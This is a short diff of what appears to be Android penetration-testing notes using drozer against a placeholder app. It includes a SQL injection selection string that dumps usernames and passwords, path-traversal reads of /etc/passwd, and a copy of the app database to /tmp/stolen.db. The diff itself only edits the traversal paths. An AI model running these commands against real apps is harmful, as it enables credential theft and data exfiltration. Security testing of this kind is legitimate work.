@@ -102,8 +102,8 @@ run app.provider.query content://com.target.app.provider/users \
   --selection "1=1) UNION SELECT username,password FROM users--"
 
 # Test path traversal
-run app.provider.read content://com.target.app.provider/../../etc/passwd
-run app.provider.download content://com.target.app.provider/../databases/app.db /tmp/stolen.db
+run app.provider.read content://com.target.app.provider/etc/passwd
+run app.provider.download content://com.target.app.provider/databases/app.db /tmp/stolen.db
 
 # Find injectable providers
 run scanner.provider.injection -a com.target.app
